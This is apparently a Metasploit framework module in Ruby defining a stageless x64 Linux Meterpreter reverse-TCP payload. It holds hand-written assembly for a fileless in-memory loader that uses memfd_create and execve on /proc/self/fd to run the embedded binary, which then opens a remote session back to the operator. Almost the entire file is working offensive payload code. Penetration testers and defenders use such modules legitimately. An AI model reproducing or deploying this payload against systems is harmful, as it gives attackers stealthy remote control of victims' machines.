##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Module generated by tools/modules/generate_mettle_payloads.rb
module MetasploitModule
  CachedSize = 1121480

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions::Linux
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Meterpreter, Reverse TCP Inline',
        'Description' => 'Run the Meterpreter / Mettle server payload (stageless)',
        'Author' => [
          'Adam Cammack <adam_cammack[at]rapid7.com>',
          'Brent Cook <brent_cook[at]rapid7.com>',
          'timwr'
        ],
        'Platform' => 'linux',
        'Arch' => ARCH_X64,
        'License' => MSF_LICENSE,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::Meterpreter_x64_Linux
      )
    )
  end

  def generate(_opts = {})
    opts = {
      scheme: 'tcp',
      stageless: true
    }.merge(mettle_logging_config)
    payload = MetasploitPayloads::Mettle.new('x86_64-linux-musl', generate_config(opts)).to_binary :exec
    in_memory_loader_asm = %Q^
    start:
      xor rsi, rsi
      push rsi
      lea rdi, [rsp]
      inc rsi
      mov rax, 0x13F
      syscall                           ; memfd_create("", MFD_CLOEXEC);
      mov rdi, rax
      jmp get_payload
    got_payload:
      pop rsi
      mov rdx, #{payload.length}
      xor rax, rax
      inc rax
      syscall                            ; write(fd, elfbuffer, elfbuffer_len);
      jmp get_command
    got_command:
      pop rbx
      mov rcx, 18
      mov rax, rdi
    itoa:
      test rax, rax
      jz fixpath
      mov rdx, 10
      div dl
      mov rdx, rax
      shr rdx, 8
      and rax, 255
      add rdx, 48
      mov byte [rbx + rcx], dl
      dec rcx
      jmp itoa
    fixpath:
      cmp rcx, 13
      je execve
      mov byte [rbx + rcx], '/'
      dec rcx
      jmp fixpath
    execve:
      mov rdi, rbx
      xor rdx, rdx
      xor rsi, rsi
      mov eax, 0x3b
      syscall                           ; execve("/proc/self/fd/<fd>", NULL, NULL);

    get_command:
      call got_command
      db "/proc/self/fd/", 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    get_payload:
      call got_payload
    ^
    in_memory_loader = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
    in_memory_loader + payload
  end
end
